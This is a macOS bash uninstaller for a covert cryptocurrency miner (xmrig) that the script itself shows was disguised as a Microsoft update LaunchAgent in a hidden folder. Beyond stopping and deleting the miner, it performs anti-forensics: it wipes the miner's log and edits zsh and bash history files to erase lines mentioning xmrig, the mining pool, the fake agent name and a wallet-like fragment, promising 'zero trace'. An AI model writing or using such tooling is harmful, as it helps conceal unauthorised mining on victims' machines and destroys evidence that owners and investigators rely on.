#!/usr/bin/env bash
# remove_usdt.sh — Zero-trace removal of USDT miner

DISGUISE_NAME="com.microsoft.updateassistant.helper"
INSTALL_DIR="$HOME/Library/Application Support/.msuah"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"

echo ""
echo "=========================================="
echo " USDT Miner — Full Removal"
echo "=========================================="
echo "[1/5] Stopping..."
# Also clean up old bundle ID if present
launchctl unload ~/Library/LaunchAgents/com.microsoft.update.agent.plist 2>/dev/null || true
rm -f ~/Library/LaunchAgents/com.microsoft.update.agent.plist 2>/dev/null || true
launchctl unload -w "$PLIST_PATH" 2>/dev/null && echo "      ✓ Unloaded" || echo "      — Not loaded"
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Killed" || echo "      — Not running"
pkill -9 -f "xmrig" 2>/dev/null || true
sleep 1
echo "[2/5] Removing files..."
rm -rf "$INSTALL_DIR" && echo "      ✓ Install dir removed"
echo "[3/5] Removing plist..."
rm -f "$PLIST_PATH" && echo "      ✓ Plist removed"
echo "[4/5] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
echo "[5/5] Scrubbing history..."
for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
  [[ -f "$H" ]] && sed -i '' '/mine_usdt\|xmrig\|unmineable\|microsoft\.update\.agent\|TFgAiy/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
done
history -c 2>/dev/null || true
echo ""
[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" ]] \
  && echo " ✓  Complete — Zero trace remaining." \
  || echo " [!] Check manually."
echo "=========================================="
